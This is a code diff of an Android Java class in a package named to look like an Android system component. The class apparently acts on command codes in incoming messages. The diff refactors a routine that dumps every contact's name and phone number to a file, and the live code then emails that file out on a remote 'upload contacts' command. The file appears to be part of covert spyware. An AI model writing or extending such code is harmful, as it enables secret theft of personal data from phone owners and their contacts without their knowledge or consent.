@@ -1,8 +1,6 @@
 package com.android.system.controled.util;
 
 import java.io.File;
-import java.lang.reflect.Field;
-import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 
@@ -14,8 +12,8 @@ import android.net.wifi.WifiManager;
 import android.util.Log;
 
 import com.android.system.controled.Globle;
+import com.android.system.controled.bean.ContactBean;
 import com.android.system.controled.db.DatabaseUtil;
-import com.android.system.controled.util.ContactsUtil.ContactBean;
 
 public class DoAboutCodeUtils {
 
@@ -91,7 +89,7 @@ public class DoAboutCodeUtils {
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_CONTACTS)) {
 				Log.e(TAG, "开始上传联系人");
-				createContactsFile(context);
+				ContactsUtil.createContactsFile(context);
 				SendEmailUtil send3 = new SendEmailUtil();
 				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
 					send3.upLoadContact(context, true);
@@ -348,17 +346,6 @@ public class DoAboutCodeUtils {
 	// }
 	// }
 
-	private static void createContactsFile(Context con) {
-		ArrayList<ContactBean> contacts = ContactsUtil.getAllContacts(con);
-		if (contacts != null) {
-			String contactsStr = "";
-			for (ContactBean c : contacts) {
-				contactsStr = contactsStr + "电话：" + c.number + "    姓名：" + c.name + "\r\n";
-			}
-			if (!contactsStr.equals("") && contactsStr.length() > 0) {
-				FileUtil.writeFile(contactsStr, Globle.FILE_CONTACTS, false);
-			}
-		}
-	}
+	
 
 }
